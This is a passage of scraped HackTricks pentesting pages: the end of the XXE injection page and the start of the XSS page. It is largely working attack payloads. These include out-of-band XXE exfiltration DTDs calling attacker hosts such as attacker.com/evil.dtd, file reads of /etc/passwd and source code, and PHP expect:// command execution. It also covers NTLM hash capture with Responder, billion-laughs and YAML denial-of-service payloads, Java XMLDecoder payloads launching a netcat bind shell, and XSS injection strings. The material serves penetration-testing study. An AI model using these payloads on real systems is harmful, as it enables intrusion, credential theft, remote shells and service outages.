created earlier, run the following:\nFrom the \"unzipped\" directory that we created earlier, run the following:\nNow upload the file to your (hopefully) vulnerable web application and pray to the hacking gods for a request in your Burp Collaborator logs.\nJar: protocol\nThe\njar\nprotocol is only available on\nJava applications\n. It allows to access files inside a\nPKZIP\nfile (\n.zip\n,\n.jar\n, ...) and works for local and remote files:\njar:file:///var/myarchive.zip!/file.txt\njar:https://download.host.com/myarchive.zip!/file.txt\nTo be able to access files inside PKZIP files is\nsuper useful to abuse XXE via system DTD files.\nCheck\nthis section to learn how to abuse system DTD files\n.\nBehind the scenes\n1.\nIt makes an HTTP request to load the zip archive.\nhttps://download.host.com/myarchive.zip\n2.\nIt saves the HTTP response to a temporary location.\n/tmp/...\n3.\nIt extracts of the archive.\n4.\nIt reads the\nfile.zip\n5.\nIt delete temporary files.\nNote that it's possible to stop the flow in the second step. The trick is to never close the connection when serving the file.\nThis tools can be useful\n: one in python\nslow_http_server.py\nand one in java\nslowserver.jar\n.\nOnce the server has downloaded your file, you need to find its location by browsing the temp directory. Being random, the file path can't be predict in advance.\nJar\nWriting files in a temporary directory can help to\nescalate another vulnerability that involves a path traversal\n(such as local file include, template injection, XSLT RCE, deserialization, etc).\nXSS\n<![CDATA[<]]>\nscript\n<![CDATA[>]]>\nalert(1)\n<![CDATA[<]]>\n/script\n<![CDATA[>]]>\nDoS\nBillion Laugh Attack\n<!\nDOCTYPE\ndata\n[\n<\n!ENTITY\na0\n\"dos\"\n>\n<\n!ENTITY\na1\n\"&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;\"\n>\n<\n!ENTITY\na2\n\"&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;\"\n>\n<\n!ENTITY\na3\n\"&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;\"\n>\n<\n!ENTITY\na4\n\"&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;\"\n>\n]>\n<\ndata\n>\n&a4;\n</\ndata\n>\nYaml Attack\na: &a [\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\"]\nb: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]\nc: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]\nd: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]\ne: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]\nf: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]\ng: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]\nh: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]\ni: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]\nQuadratic Blowup Attack\nGetting NTML\nOn Windows hosts it is possible to get the NTML hash of the web server user by setting a responder.py handler:\nResponder.py -I eth0 -v\nand by sending the following request\n<!--?xml version=\"1.0\" ?-->\n<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>\n<data>&example;</data>\nThen you can try to crack the hash using hashcat\nHidden XXE Surfaces\nXInclude\n‚Äã\nFrom here.\n‚Äã\nSome applications\nreceive client-submitted data, embed it on the server-side into an XML document, and then parse the document\n. An example of this occurs when client-submitted data is placed into a\nbackend SOAP request\n, which is then processed by the backend SOAP service.\nIn this situation, you cannot carry out a classic XXE attack, because\nyou don't control the entire XML\ndocument and so cannot define or modify a\nDOCTYPE\nelement. However, you might be able to use\nXInclude\ninstead.\nXInclude\nis a part of the XML specification that allows an XML document to be built from sub-documents. You can place an\nXInclude\nattack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server-side XML document.\nTo perform an\nXInclude\nattack, you need to reference the\nXInclude\nnamespace and provide the path to the file that you wish to include. For example:\nproductId=\n<\nfoo\nxmlns:\nxi\n=\n\"\nhttp://www.w3.org/2001/XInclude\n\"\n>\n<\nxi:\ninclude\nparse\n=\n\"\ntext\n\"\nhref\n=\n\"\nfile:///etc/passwd\n\"\n/>\n</\nfoo\n>\n&storeId=1\nSVG - File Upload\n‚Äã\nFrom here.\n‚Äã\nSome applications allow users to upload files which are then processed server-side. Some common file formats use XML or contain XML subcomponents. Examples of XML-based formats are office document formats like DOCX and image formats like SVG.\nFor example, an application might allow users to\nupload images\n, and process or validate these on the server after they are uploaded. Even if the application expects to receive a format like PNG or JPEG, the\nimage processing library that is being used might support SVG images\n. Since the SVG format uses XML, an attacker can submit a malicious SVG image and so reach hidden attack surface for XXE vulnerabilities.\n<\nsvg\nxmlns\n=\n\"\nhttp://www.w3.org/2000/svg\n\"\nxmlns:\nxlink\n=\n\"\nhttp://www.w3.org/1999/xlink\n\"\nwidth\n=\n\"\n300\n\"\nversion\n=\n\"\n1.1\n\"\nheight\n=\n\"\n200\n\"\n>\n<\nimage\nxlink:\nhref\n=\n\"\nfile:///etc/hostname\n\"\n>\n</\nimage\n>\n</\nsvg\n>\nYou could also try to\nexecute commands\nusing the PHP \"expect\" wrapper:\n<\nsvg\nxmlns\n=\n\"\nhttp://www.w3.org/2000/svg\n\"\nxmlns:\nxlink\n=\n\"\nhttp://www.w3.org/1999/xlink\n\"\nwidth\n=\n\"\n300\n\"\nversion\n=\n\"\n1.1\n\"\nheight\n=\n\"\n200\n\"\n>\n<\nimage\nxlink:\nhref\n=\n\"\nexpect://ls\n\"\n>\n</\nimage\n>\n</\nsvg\n>\nNote the first line of the read file or of the result of the execution will appear INSIDE the created image. So you need to be able to access the image SVG has created.\nPDF - File upload\nRead the following post to\nlearn how to exploit a XXE uploading a PDF\nfile:\nPDF Upload - XXE and CORS bypass\nContent-Type: From x-www-urlencoded to XML\nIf a POST request accepts the data in XML format, you could try to exploit a XXE in that request. For example, if a normal request contains the following:\nPOST /action HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 7\n‚Äã\nfoo=bar\nThen you might be able submit the following request, with the same result:\nPOST /action HTTP/1.0\nContent-Type: text/xml\nContent-Length: 52\n‚Äã\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<\nfoo\n>\nbar\n</\nfoo\n>\nContent-Type: From JSON to XEE\nTo change the request you could use a Burp Extension named ‚Äú\nContent Type Converter\n‚Äú.\nHere\nyou can find this example:\nContent-Type: application/json;charset=UTF-8\n‚Äã\n{\"root\": {\"root\": {\n\"firstName\": \"Avinash\",\n\"lastName\": \"\",\n\"country\": \"United States\",\n\"city\": \"ddd\",\n\"postalCode\": \"ddd\"\n}}}\nContent-Type: application/xml;charset=UTF-8\n‚Äã\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!\nDOCTYPE\ntestingxxe\n[\n<!ENTITY xxe SYSTEM \"http://34.229.92.127:8000/TEST.ext\" >\n]>\n<\nroot\n>\n<\nroot\n>\n<\nfirstName\n>\n&xxe;\n</\nfirstName\n>\n<\nlastName\n/>\n<\ncountry\n>\nUnited States\n</\ncountry\n>\n<\ncity\n>\nddd\n</\ncity\n>\n<\npostalCode\n>\nddd\n</\npostalCode\n>\n</\nroot\n>\n</\nroot\n>\nAnother example can be found\nhere\n.\nWAF & Protections Bypasses\nBase64\n<!\nDOCTYPE\ntest\n[\n<!ENTITY % init SYSTEM \"data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk\"> %init;\n]>\n<\nfoo\n/>\nThis only work if the XML server accepts the\ndata://\nprotocol.\nUTF-7\nYou can use the [\n\"Encode Recipe\n\" of cyberchef here ]([\nhttps://gchq.github.io/CyberChef/#recipe=Encode_text%28'UTF-7\n%2865000%29'%29&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to](\nhttps://gchq.github.io/CyberChef/#recipe=Encode_text%28'UTF-7 %2865000%29'%29&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to\n) transform to UTF-7.\n<\n!xml\nversion\n=\n\"\n1.0\n\"\nencoding\n=\n\"\nUTF-7\n\"\n?--\n>\n+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-\n<?xml version=\"1.0\" encoding=\"UTF-7\"?>\n+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4\n+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+\n+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4\nFile:/ Protocol Bypass\nIf the web is using PHP, instead of using\nfile:/\nyou can use\nphp wrappers\nphp://filter/convert.base64-encode/resource=\nto\naccess internal files\n.\nIf the web is using Java you may check the\njar: protocol\n.\nHTML Entities\nTrick from\nhttps://github.com/Ambrotd/XXE-Notes\nYou can create an\nentity inside an entity\nencoding it with\nhtml entities\nand then call it to\nload a dtd\n.\nNote that the\nHTML Entities\nused needs to be\nnumeric\n(like [in this example](\nhttps://gchq.github.io/CyberChef/#recipe=To_HTML_Entity%28true,'Numeric entities'%29&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\\n).\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!\nDOCTYPE\nfoo\n[\n<\n!ENTITY\n%\na\n\"&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;\"\n>\n%a;%dtd;\n]>\n<\ndata\n>\n<\nenv\n>\n&exfil;\n</\nenv\n>\n</\ndata\n>\nDTD example:\n<!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=/flag\">\n<!ENTITY % abt \"<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>\">\n%abt;\n%exfil;\nPHP Wrappers\nBase64\nExtract\nindex.php\n<!\nDOCTYPE\nreplace\n[\n<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">\n]>\nExtract external resource\n<!\nDOCTYPE\nreplace\n[\n<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=http://10.0.0.3\">\n]>\nRemote code execution\nIf PHP \"expect\" module is loaded\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!\nDOCTYPE\nfoo\n[\n<\n!ELEMENT\nfoo\nANY\n>\n<!ENTITY xxe SYSTEM \"expect://id\" >\n]>\n<\ncreds\n>\n<\nuser\n>\n&xxe;\n</\nuser\n>\n<\npass\n>\nmypass\n</\npass\n>\n</\ncreds\n>\nSOAP - XEE\n<\nsoap:\nBody\n>\n<\nfoo\n>\n<![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM \"http://x.x.x.x:22/\"> %dtd;]><xxx/>]]>\n</\nfoo\n>\n</\nsoap:\nBody\n>\nXLIFF - XXE\nThis section was taken from\nhttps://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe\nAccording to the\nWikipedia\n:\nXLIFF (XML Localization Interchange File Format) is an XML-based bitext format created to standardize the way localizable data are passed between and among tools during a localization process and a common format for CAT tool exchange.\nBlind request\n------WebKitFormBoundaryqBdAsEtYaBjTArl3\nContent-Disposition: form-data; name=\"file\"; filename=\"xxe.xliff\"\nContent-Type: application/x-xliff+xml\n‚Äã\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!\nDOCTYPE\nXXE\n[\n<!ENTITY % remote SYSTEM \"http://redacted.burpcollaborator.net/?xxe_test\"> %remote;\n]>\n<\nxliff\nsrcLang\n=\n\"\nen\n\"\ntrgLang\n=\n\"\nms-MY\n\"\nversion\n=\n\"\n2.0\n\"\n>\n</\nxliff\n>\n------WebKitFormBoundaryqBdAsEtYaBjTArl3--\nThe server response with an error:\n{\n\"status\"\n:\n500\n,\n\"error\"\n:\n\"Internal Server Error\"\n,\n\"message\"\n:\n\"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed.\"\n}\nBut we got a hit on Burp Collaborator.\nExfiltrating Data via Out of Band\n------WebKitFormBoundaryqBdAsEtYaBjTArl3\nContent-Disposition: form-data; name=\"file\"; filename=\"xxe.xliff\"\nContent-Type: application/x-xliff+xml\n‚Äã\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!\nDOCTYPE\nXXE\n[\n<!ENTITY % remote SYSTEM \"http://attacker.com/evil.dtd\"> %remote;\n]>\n<\nxliff\nsrcLang\n=\n\"\nen\n\"\ntrgLang\n=\n\"\nms-MY\n\"\nversion\n=\n\"\n2.0\n\"\n>\n</\nxliff\n>\n------WebKitFormBoundaryqBdAsEtYaBjTArl3--\nBased on the displayed User Agent returned by burp collaborator, it appears that it is using\nJava 1.8\n. One of the problems when exploiting XXE on this version of Java is\nwe‚Äôre unable to obtain the files containing a\nNew Line\nsuch as\n/etc/passwd\nusing the Out of Band technique.\nExfiltrating Data via Error Based\nDTD File:\n<!ENTITY % data SYSTEM \"file:///etc/passwd\">\n<!ENTITY % foo \"<!ENTITY\n&#37;\nxxe SYSTEM 'file:///nofile/'>\">\n%foo;\n%xxe;\nServer Response:\n{\n\"status\"\n:\n500\n,\n\"error\"\n:\n\"Internal Server Error\"\n,\n\"message\"\n:\n\"IO error.\\nReason: /nofile (No such file or directory)\"\n}\nGreat! The\nnon-exist\nfile is reflected in the Error messages. Next is adding the File Content.\nDTD File:\n<!ENTITY % data SYSTEM \"file:///etc/passwd\">\n<!ENTITY % foo \"<!ENTITY\n&#37;\nxxe SYSTEM 'file:///nofile/%data;'>\">\n%foo;\n%xxe;\nAnd the content of the file was successfully\nprinted in the output of the error sent via HTTP\n.\nRSS - XEE\nValid XML with RSS format to exploit an XXE vulnerability.\nPing back\nSimple HTTP request to attackers server\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!\nDOCTYPE\ntitle\n[\n<\n!ELEMENT\ntitle\nANY\n>\n<!ENTITY xxe SYSTEM \"http://\n<\nAttackIP\n>\n/rssXXE\" >\n]>\n<\nrss\nversion\n=\n\"\n2.0\n\"\nxmlns:\natom\n=\n\"\nhttp://www.w3.org/2005/Atom\n\"\n>\n<\nchannel\n>\n<\ntitle\n>\nXXE Test Blog\n</\ntitle\n>\n<\nlink\n>\nhttp://example.com/\n</\nlink\n>\n<\ndescription\n>\nXXE Test Blog\n</\ndescription\n>\n<\nlastBuildDate\n>\nMon, 02 Feb 2015 00:00:00 -0000\n</\nlastBuildDate\n>\n<\nitem\n>\n<\ntitle\n>\n&xxe;\n</\ntitle\n>\n<\nlink\n>\nhttp://example.com\n</\nlink\n>\n<\ndescription\n>\nTest Post\n</\ndescription\n>\n<\nauthor\n>\n[email¬†protected]\n</\nauthor\n>\n<\npubDate\n>\nMon, 02 Feb 2015 00:00:00 -0000\n</\npubDate\n>\n</\nitem\n>\n</\nchannel\n>\n</\nrss\n>\nRead file\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!\nDOCTYPE\ntitle\n[\n<\n!ELEMENT\ntitle\nANY\n>\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >\n]>\n<\nrss\nversion\n=\n\"\n2.0\n\"\nxmlns:\natom\n=\n\"\nhttp://www.w3.org/2005/Atom\n\"\n>\n<\nchannel\n>\n<\ntitle\n>\nThe Blog\n</\ntitle\n>\n<\nlink\n>\nhttp://example.com/\n</\nlink\n>\n<\ndescription\n>\nA blog about things\n</\ndescription\n>\n<\nlastBuildDate\n>\nMon, 03 Feb 2014 00:00:00 -0000\n</\nlastBuildDate\n>\n<\nitem\n>\n<\ntitle\n>\n&xxe;\n</\ntitle\n>\n<\nlink\n>\nhttp://example.com\n</\nlink\n>\n<\ndescription\n>\na post\n</\ndescription\n>\n<\nauthor\n>\n[email¬†protected]\n</\nauthor\n>\n<\npubDate\n>\nMon, 03 Feb 2014 00:00:00 -0000\n</\npubDate\n>\n</\nitem\n>\n</\nchannel\n>\n</\nrss\n>\nRead source code\nUsing PHP base64 filter\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!\nDOCTYPE\ntitle\n[\n<\n!ELEMENT\ntitle\nANY\n>\n<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php\" >\n]>\n<\nrss\nversion\n=\n\"\n2.0\n\"\nxmlns:\natom\n=\n\"\nhttp://www.w3.org/2005/Atom\n\"\n>\n<\nchannel\n>\n<\ntitle\n>\nThe Blog\n</\ntitle\n>\n<\nlink\n>\nhttp://example.com/\n</\nlink\n>\n<\ndescription\n>\nA blog about things\n</\ndescription\n>\n<\nlastBuildDate\n>\nMon, 03 Feb 2014 00:00:00 -0000\n</\nlastBuildDate\n>\n<\nitem\n>\n<\ntitle\n>\n&xxe;\n</\ntitle\n>\n<\nlink\n>\nhttp://example.com\n</\nlink\n>\n<\ndescription\n>\na post\n</\ndescription\n>\n<\nauthor\n>\n[email¬†protected]\n</\nauthor\n>\n<\npubDate\n>\nMon, 03 Feb 2014 00:00:00 -0000\n</\npubDate\n>\n</\nitem\n>\n</\nchannel\n>\n</\nrss\n>\nJava XMLDecoder XEE to RCE\nXMLDecoder is a Java class that creates objects based on a XML message. If a malicious user can get an application to use arbitrary data in a call to the method\nreadObject\n, he will instantly gain code execution on the server.\nUsing Runtime().exec()\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<\njava\nversion\n=\n\"\n1.7.0_21\n\"\nclass\n=\n\"\njava.beans.XMLDecoder\n\"\n>\n<\nobject\nclass\n=\n\"\njava.lang.Runtime\n\"\nmethod\n=\n\"\ngetRuntime\n\"\n>\n<\nvoid\nmethod\n=\n\"\nexec\n\"\n>\n<\narray\nclass\n=\n\"\njava.lang.String\n\"\nlength\n=\n\"\n6\n\"\n>\n<\nvoid\nindex\n=\n\"\n0\n\"\n>\n<\nstring\n>\n/usr/bin/nc\n</\nstring\n>\n</\nvoid\n>\n<\nvoid\nindex\n=\n\"\n1\n\"\n>\n<\nstring\n>\n-l\n</\nstring\n>\n</\nvoid\n>\n<\nvoid\nindex\n=\n\"\n2\n\"\n>\n<\nstring\n>\n-p\n</\nstring\n>\n</\nvoid\n>\n<\nvoid\nindex\n=\n\"\n3\n\"\n>\n<\nstring\n>\n9999\n</\nstring\n>\n</\nvoid\n>\n<\nvoid\nindex\n=\n\"\n4\n\"\n>\n<\nstring\n>\n-e\n</\nstring\n>\n</\nvoid\n>\n<\nvoid\nindex\n=\n\"\n5\n\"\n>\n<\nstring\n>\n/bin/sh\n</\nstring\n>\n</\nvoid\n>\n</\narray\n>\n</\nvoid\n>\n</\nobject\n>\n</\njava\n>\nProcessBuilder\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<\njava\nversion\n=\n\"\n1.7.0_21\n\"\nclass\n=\n\"\njava.beans.XMLDecoder\n\"\n>\n<\nvoid\nclass\n=\n\"\njava.lang.ProcessBuilder\n\"\n>\n<\narray\nclass\n=\n\"\njava.lang.String\n\"\nlength\n=\n\"\n6\n\"\n>\n<\nvoid\nindex\n=\n\"\n0\n\"\n>\n<\nstring\n>\n/usr/bin/nc\n</\nstring\n>\n</\nvoid\n>\n<\nvoid\nindex\n=\n\"\n1\n\"\n>\n<\nstring\n>\n-l\n</\nstring\n>\n</\nvoid\n>\n<\nvoid\nindex\n=\n\"\n2\n\"\n>\n<\nstring\n>\n-p\n</\nstring\n>\n</\nvoid\n>\n<\nvoid\nindex\n=\n\"\n3\n\"\n>\n<\nstring\n>\n9999\n</\nstring\n>\n</\nvoid\n>\n<\nvoid\nindex\n=\n\"\n4\n\"\n>\n<\nstring\n>\n-e\n</\nstring\n>\n</\nvoid\n>\n<\nvoid\nindex\n=\n\"\n5\n\"\n>\n<\nstring\n>\n/bin/sh\n</\nstring\n>\n</\nvoid\n>\n</\narray\n>\n<\nvoid\nmethod\n=\n\"\nstart\n\"\nid\n=\n\"\nprocess\n\"\n>\n</\nvoid\n>\n</\nvoid\n>\n</\njava\n>\nTools\nGitHub - luisfontes19/xxexploiter: Tool to help exploit XXE vulnerabilities\nGitHub\nMore resources\n‚Äã\nhttps://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf\nhttps://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html\nExtract info via HTTP using own external DTD:\nhttps://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection\nhttps://gist.github.com/staaldraad/01415b990939494879b4\nhttps://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9\nhttps://portswigger.net/web-security/xxe\nhttps://gosecure.github.io/xxe-workshop/#7\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPentesting Web -\nPrevious\nXSLT Server Side Injection (Extensible Stylesheet Language Transformations)\nNext\n- Pentesting Web\nXSS (Cross Site Scripting)\nLast modified\n6mo ago"
    },
    {
        "title": "XSS (Cross Site Scripting)",
        "url": "https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting",
        "text": "XSS (Cross Site Scripting)\n/\n‚Äã\nBug bounty tip\n:\nsign up\nfor\nIntigriti\n, a premium\nbug bounty platform created by hackers, for hackers\n! Join us at\nhttps://go.intigriti.com/hacktricks\ntoday, and start earning bounties up to\n$100,000\n!\nRegister - Intigriti\nRegister - Intigriti\nMethodology\n1.\nCheck if\nany value you control\n(\nparameters\n,\npath\n,\nheaders\n?,\ncookies\n?) is being\nreflected\nin the HTML or\nused\nby\nJS\ncode.\n2.\nFind the context\nwhere it's reflected/used.\n3.\nIf\nreflected\n1.\nCheck\nwhich symbols can you use\nand depending on that, prepare the payload:\n1.\nIn\nraw HTML\n:\n1.\nCan you create new HTML tags?\n2.\nCan you use events or attributes supporting\njavascript:\nprotocol?\n3.\nCan you bypass protections?\n4.\nIs the HTML content being interpreted by any client side JS engine (\nAngularJS\n,\nVueJS\n,\nMavo\n...), you could abuse a\nClient Side Template Injection\n.\n5.\nIf you cannot create HTML tags that execute JS code, could you abuse a\nDangling Markup - HTML scriptless injection\n?\n2.\nInside a\nHTML tag\n:\n1.\nCan you exit to raw HTML context?\n2.\nCan you create new events/attributes to execute JS code?\n3.\nDoes the attribute where you are trapped support JS execution?\n4.\nCan you bypass protections?\n3.\nInside\nJavaScript code\n:\n1.\nCan you escape the\n<script>\ntag?\n2.\nCan you escape the string and execute different JS code?\n3.\nAre your input in template literals ``?\n4.\nCan you bypass protections?\n4.\nJavascript\nfunction\nbeing\nexecuted\n1.\nYou can indicate the name of the function to execute. e.g.:\n?callback=alert(1)\n4.\nIf\nused\n:\n1.\nYou could exploit a\nDOM XSS\n, pay attention how your input is controlled and if your\ncontrolled input is used by any sink.\nWhen working on a complex XSS you might find interesting to know about:\nDebugging Client Side JS\nReflected values\nIn order to successfully exploit a XSS the first thing you need to find is a\nvalue controlled by you that is being reflected\nin the web page.\nIntermediately reflected\n: If you find that the value of a parameter or even the path is being reflected in the web page you could exploit a\nReflected XSS\n.\nStored and reflected\n: If you find that a value controlled by you is saved in the server and is reflected every time you access a page you could exploit a\nStored XSS\n.\nAccessed via JS\n: If you find that a value controlled by you is being access using JS you could exploit a\nDOM XSS\n.\nContexts\nWhen trying to exploit a XSS the first thing you need to know if\nwhere is your input being reflected\n. Depending on the context, you will be able to execute arbitrary JS code on different ways.\nRaw HTML\nIf your input is\nreflected on the raw HTML\npage you will need to abuse some\nHTML tag\nin order to execute JS code:\n<img , <iframe , <svg , <script\n... these are just some of the many possible HTML tags you could use.\nAlso, keep in mind\nClient Side Template Injection\n.\nInside HTML tags attribute\nIf your input is reflected inside the value of the attribute of a tag you could try:\n1.\nTo\nescape from the attribute and from the tag\n(then you will be in the raw HTML) and create new HTML tag to abuse:\n\"><img [...]\n2.\nIf you\ncan escape from the attribute but not from the tag\n(\n>\nis encoded or deleted), depending on the tag you could\ncreate an event\nthat executes JS code:\n\" autofocus onfocus=alert(1) x=\"\n3.\nIf you\ncannot escape from the attribute\n(\n\"\nis being encoded or deleted), then depending on\nwhich attribute\nyour value is being reflected in\nif you control all the value or just a part\nyou will be able to abuse it. For\nexample\n, if you control an event like\nonclick=\nyou will be able to make it execute arbitrary code when it's clicked. Another interesting\nexample\nis the attribute\nhref\n, where you can use the\njavascript:\nprotocol to execute arbitrary code:\nhref=\"javascript:alert(1)\"\n4.\nIf your input is reflected inside \"\nunexpoitable tags\n\" you could try the\naccesskey\ntrick to abuse the vuln (you will need some kind of social engineer to exploit this):\n\" accesskey=\"x\" onclick=\"alert(1)\" x=\"\nInside JavaScript code\nIn this case your input is reflected between\n<script> [...] </script>\ntags of a HTML page, inside a\n.js\nfile or inside an attribute using\njavascript:\nprotocol:\nIf reflected between\n<script> [...] </script>\ntags, even if your input if inside any kind of quotes, you can try to inject\n</script>\nand escape from this context. This works because the\nbrowser will first parse the HTML tags\nand then the content, therefore, it won't notice that your injected\n</script>\ntag is inside the HTML code.\nIf reflected\ninside a JS string\nand the last trick isn't working you would need to\nexit\nthe string,\nexecute\nyour code and\nreconstruct\nthe JS code (if there is any error, it won't be executed:\n'-alert(1)-'\n';-alert(1)//\n\\';alert(1)//\nIf reflected inside template literals you can\nembed JS expressions\nusing\n${ ... }\nsyntax:\nvar greetings = `Hello, ${alert(1)}`\nUnicode encode\nworks to write\nvalid javascript code\n:\n\\u\n{\n61\n}\nlert\n(\n1\n)\n\\\nu0061lert\n(\n1\n)\n\\u\n{\n0061\n}\nlert\n(\n1\n)\nJavascript Hoisting\nJavascript Hoisting references the opportunity to\ndeclare functions, variables or classes after they are used\n.\nTherefore if you have scenarios where you can\nInject JS code after an undeclared object\nis used, you could\nfix the syntax\nby declaring it (so your code gets executed instead of throwing an error):\n// The function vulnerableFunction is not defined\nvulnerableFunction\n(\n'test'\n,\n'<INJECTION>'\n);\n// You can define it in your injection to execute JS\n//Payload1: param='-alert(1)-'')%3b+function+vulnerableFunction(a,b){return+1}%3b\n'-alert(1)-'\n'\n);\nfunction\nvulnerableFunction\n(\na\n,\nb\n){\nreturn\n1\n};\n‚Äã\n//Payload2: param=test')%3bfunction+vulnerableFunction(a,b){return+1}%3balert(1)\ntest'\n);\nfunction\nvulnerableFunction\n(\na\n,\nb\n){\nreturn\n1\n};\nalert\n(\n1\n)\n// If a variable is not defined, you could define it in the injection\n// In the following example var a is not defined\nfunction\nmyFunction\n(\na\n,\nb\n){\nreturn\n1\n};\nmyFunction\n(\na\n,\n'<INJECTION>'\n)\n‚Äã\n//Payload: param=test')%3b+var+a+%3d+1%3b+alert(1)%3b\ntest'\n);\nvar\na\n=\n1\n;\nalert\n(\n1\n);\n// If an undeclared class is used, you cannot declare it AFTER being used\nvar\nvariable\n=\nnew\nunexploitableClass\n();\n<\nINJECTION\n>\n// But you can actually declare it as a function, being able to fix the syntax with something like:\nfunction\nunexploitableClass\n()\n{\nreturn\n1\n;\n}\nalert\n(\n1\n);\n// Properties are not hoisted\n// So the following examples where the 'cookie' attribute doesn¬¥t exist\n// cannot be fixed if you can only inject after that code:\ntest\n.\ncookie\n(\n'leo'\n,\n'INJECTION'\n)\ntest\n[\n'cookie'\n,\n'injection'\n]\nFor more info about Javascript Hoisting check:\nhttps://jlajara.gitlab.io/Javascript_Hoisting_in_XSS_Scenarios\n‚Äã\nJavascript Function\nSeveral web pages have endpoints that\naccept as parameter the name of the function to execute\n. A common example to see in the wild is something like:\n?callback=callbackFunc\n.\nA good way to find out if something given directly by the user is trying to be executed is\nmodifying the param value\n(for example to 'Vulnerable') and looking in the console for errors like:\nIn case it's vulnerable, you could be able to\ntrigger an alert\njust doing sending the value:\n?callback=alert(1)\n. However, it' very common that this endpoints 